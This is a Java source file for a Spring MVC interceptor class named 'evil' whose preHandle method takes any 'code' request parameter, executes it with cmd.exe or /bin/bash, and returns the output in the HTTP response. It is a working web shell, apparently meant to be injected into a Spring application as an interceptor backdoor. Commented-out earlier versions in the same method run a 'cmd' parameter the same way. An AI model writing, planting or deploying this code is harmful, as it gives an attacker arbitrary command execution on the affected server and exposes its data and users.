import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * @ClassName: evil_interceptor
 * @Auther: niko
 * @Date: 2024/9/30 16:15
 * @Description:
 */
public class evil implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
//        String[] cmdline = null;
//        String osType = System.getProperty("os.name");
//        try {
//            cmdline =  osType.toLowerCase().contains("win") ?new String[]{"cmd.exe","/c",request.getParameter("cmd")}:new String[]{"/bin/sh","-c",request.getParameter("cmd")};
//            InputStream inputStream = Runtime.getRuntime().exec(cmdline).getInputStream();
//            Scanner s = new Scanner(inputStream).useDelimiter("\\A");
//            String output = s.hasNext() ? s.next() : "";
//            ServletOutputStream out = response.getOutputStream();
////            response.getWriter().write(output);
////            response.getWriter().flush();
////            response.getWriter().close();
//
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//        if (request.getParameter("cmd")!=null){
//            byte[] bytes = new byte[1024];
//            Process process = new ProcessBuilder("/bin/sh","-c",request.getParameter("cmd")).start();
//            int len = process.getInputStream().read(bytes);
//            response.getWriter().write(new String(bytes,0,len));
//            process.destroy();
//            return false;
//        }else{
//            return true;
//        }
//
//        return true;
        String code = request.getParameter("code");
        if(code != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", code});
                }else{
                    p = new ProcessBuilder(new String[]{"/bin/bash", "-c", code});
                }
                p.redirectErrorStream(true);
                Process process = p.start();
                BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String result = r.readLine();
                System.out.println(result);
                writer.println(result);
                writer.flush();
                writer.close();
            }catch (Exception e){
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
